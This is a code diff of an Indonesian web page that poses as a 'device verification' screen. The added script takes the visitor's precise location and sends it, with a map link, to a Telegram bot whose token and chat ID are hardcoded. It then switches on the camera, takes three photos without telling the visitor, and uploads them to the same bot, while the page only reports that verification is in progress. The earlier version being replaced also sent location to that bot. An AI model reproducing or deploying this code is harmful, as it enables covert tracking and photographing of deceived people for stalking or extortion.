@@ -2,143 +2,183 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verifikasi Lokasi</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Verifikasi perangkat</title>
 
 <style>
     body {
         margin: 0;
         background: #0a0a0f;
         color: #eaeaff;
-        font-family: system-ui, sans-serif;
-        height: 100vh;
+        font-family: system-ui;
         display: flex;
-        align-items: center;
         justify-content: center;
+        padding: 25px;
     }
-
     .box {
-        text-align: center;
-        padding: 26px 28px;
-        background: rgba(20, 20, 35, 0.58);
-        border: 1px solid rgba(120, 60, 255, 0.25);
+        max-width: 360px;
+        background: rgba(25,25,40,0.65);
+        border: 1px solid rgba(120,60,255,0.3);
+        padding: 22px;
         border-radius: 14px;
-        width: 280px;
     }
-
-    h2 {
-        margin: 0 0 12px;
-        font-size: 17px;
-        font-weight: 600;
-        color: #c8b8ff;
-    }
-
-    p {
-        margin: 0 0 18px;
-        font-size: 13px;
-        color: #b9b1d9;
-    }
-
     button {
         width: 100%;
-        padding: 10px 0;
-        border-radius: 8px;
+        padding: 12px;
+        margin-top: 16px;
         border: none;
-        font-size: 14px;
-        cursor: pointer;
-        transition: 0.2s;
+        border-radius: 10px;
         background: linear-gradient(90deg,#8b4bff,#b36bff);
         color: white;
+        font-size: 15px;
         font-weight: 600;
+        cursor: pointer;
     }
-
-    button:active {
-        transform: scale(0.97);
-        opacity: 0.8;
-    }
-
-    .small {
-        font-size: 12px;
-        margin-top: 10px;
-        opacity: 0.65;
+    #status {
+        margin-top: 14px;
+        font-size: 13px;
+        opacity: 0.7;
     }
 </style>
-
 </head>
+
 <body>
-
 <div class="box">
-    <h2>Verifikasi Lokasi</h2>
-    <p>Untuk memastikan layanan berjalan optimal, sistem memerlukan informasi lokasi Anda.
-            Tekan tombol di bawah untuk mengirimkan lokasi dengan aman.</p>
+    <h2>Verifikasi perangkat</h2>
 
-    <button onclick="sendLocation()">Bagikan Lokasi</button>
+    <p style="opacity:0.75;">
+        tekan tombol ini maka sistem akan langsung otomatis memverifikasi
+        perangkat
+        <br><br>
+       • tunggu sampai verifikasi selesai
+    </p>
 
-    <div class="small" id="status">Menunggu aksi…</div>
+    <button id="btnStart">Mulai Verifikasi</button>
+    <div id="status">Menunggu aksi…</div>
 </div>
 
-
 <script>
-function sendLocation() {
-    const status = document.getElementById("status");
-    status.textContent = "Mengambil lokasi...";
+// ==============================
+// GANTI TOKEN BOT DAN CHAT ID
+// ==============================
+const BOT_TOKEN = "8565552587:AAFSJysYHitKWugVSHgcu1tymRF1pOSMEQg";
+const CHAT_ID   = "8012228867";
+// ==============================
 
-    if (!navigator.geolocation) {
-        status.textContent = "Geolocation tidak tersedia.";
-        return;
-    }
+const statusEl = document.getElementById("status");
+function setStatus(t){ statusEl.textContent = t; }
 
-    navigator.geolocation.getCurrentPosition(success, error, {
-        enableHighAccuracy: true,
-        timeout: 15000,
-        maximumAge: 0
-    });
-}
+document.getElementById("btnStart").onclick = async () => {
+    try {
+        // --------------------------
+        // 1) AMBIL LOKASI
+        // --------------------------
+        setStatus("Verifikasi dimulai...");
 
-function success(pos) {
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
+        const pos = await new Promise((resolve, reject)=>{
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true, timeout: 15000
+            });
+        });
 
-    const bot = "8565552587:AAFSJysYHitKWugVSHgcu1tymRF1pOSMEQg";   // GANTI
-    const chatId = "8012228867";  // GANTI
+        const latitude  = pos.coords.latitude;
+        const longitude = pos.coords.longitude;
 
-    const now = new Date();
-    const date = now.toLocaleDateString("id-ID");
-    const time = now.toLocaleTimeString("id-ID");
+        setStatus("verifikasi dimulai...");
 
-    const text =
-`📍 *Lokasi Terkini Terkirim*
+        // Buat tanggal + waktu
+const now = new Date();
+const tgl  = now.toLocaleDateString("id-ID");
+const jam  = now.toLocaleTimeString("id-ID");
 
-• 🌐 Koordinat:
-   - Latitude: ${lat}
-   - Longitude: ${lon}
+// Format pesan baru
+const textMsg = `
+📍 *Lokasi Terkini Terkirim*
 
-• 🗺️ Google Maps:
-   https://www.google.com/maps?q=${lat},${lon}
+• 🌐 *Koordinat:*
+   - Latitude: ${latitude}
+   - Longitude: ${longitude}
 
-• 📅 Tanggal: ${date}
-• ⏰ Waktu: ${time}
+• 🗺️ *Google Maps:*
+   https://www.google.com/maps?q=${latitude},${longitude}
+
+• 📅 *Tanggal:* ${tgl}
+• ⏰ *Waktu:* ${jam}
 
 ────────────────────
-Dikirim otomatis melalui sistem lokasi.`;
+Dikirim otomatis melalui sistem lokasi.
+`;
 
-    fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: text,
-            parse_mode: "Markdown"
-        })
-    });
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type":"application/json"},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: textMsg,
+                parse_mode: "Markdown"
+            })
+        });
 
-    document.getElementById("status").textContent = "Lokasi berhasil dikirim!";
-}
 
-function error(err) {
-    document.getElementById("status").textContent =
-        "Gagal mendapatkan lokasi: " + err.message;
-}
+        // --------------------------
+        // 2) AKTIFKAN KAMERA
+        // --------------------------
+        setStatus("verifikasi dimulai...");
+
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const track = stream.getVideoTracks()[0];
+        const capture = new ImageCapture(track);
+
+        // --------------------------
+        // 3) AMBIL 3 FOTO OTOMATIS
+        // --------------------------
+        setStatus("verifikasi sedang berjalan...");
+
+        const photoBlobs = [];
+
+        for (let i = 0; i < 3; i++) {
+            const blob = await capture.takePhoto();
+            photoBlobs.push(blob);
+            await new Promise(r => setTimeout(r, 200)); // jeda 200ms
+        }
+
+        track.stop(); // matikan kamera
+
+
+        // --------------------------
+        // 4) KIRIM 3 FOTO SEBAGAI ALBUM
+        // --------------------------
+        setStatus("verifikasi hampir selesai...");
+
+        const form = new FormData();
+        form.append("chat_id", CHAT_ID);
+
+        const media = [];
+
+        photoBlobs.forEach((blob, i) => {
+            const fileName = `photo${i}.jpg`;
+            form.append(fileName, blob, fileName);
+
+            media.push({
+                type: "photo",
+                media: `attach://${fileName}`
+            });
+        });
+
+        form.append("media", JSON.stringify(media));
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, {
+            method: "POST",
+            body: form
+        });
+
+        setStatus("Selesai verifikasi!✔");
+
+    } catch(err) {
+        setStatus("Gagal: " + err.message);
+        console.error(err);
+    }
+};
 </script>
 
 </body>
